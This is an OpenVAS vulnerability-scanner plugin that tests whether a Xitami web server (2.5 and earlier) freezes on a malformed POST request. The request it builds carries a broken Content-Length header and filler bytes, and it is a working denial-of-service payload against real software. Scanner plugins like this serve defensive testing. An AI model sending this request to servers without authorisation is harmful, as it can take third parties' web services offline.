# OpenVAS Vulnerability Test
# $Id: xitami_POST_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Xitami malformed header DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It is possible to freeze the remote web server by
sending a malformed POST request. 
This is know to affect Xitami 2.5 and earlier versions.";

tag_solution = "Upgrade your software or use another";

if(description)
{
 script_id(11934);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(9083);
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_tag(name:"risk_factor", value:"High");

 name = "Xitami malformed header DoS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 summary = "Xitami malformed header POST request denial of service";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright("This script is Copyright (C) 2003 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if(! can_host_php(port:port)) exit(0);

if (http_is_dead(port: port)) exit(0);

req = string("POST /forum/index.php HTTP/1.1\r\n",
             "Host: ", get_host_name(), "\r\n",
             "Accept-Encoding: None\r\n",
	     "Content-Length: 10\n\n", 
	     crap(512), "\r\n", 
             crap(512));

soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: req);
http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port)) security_hole(port);
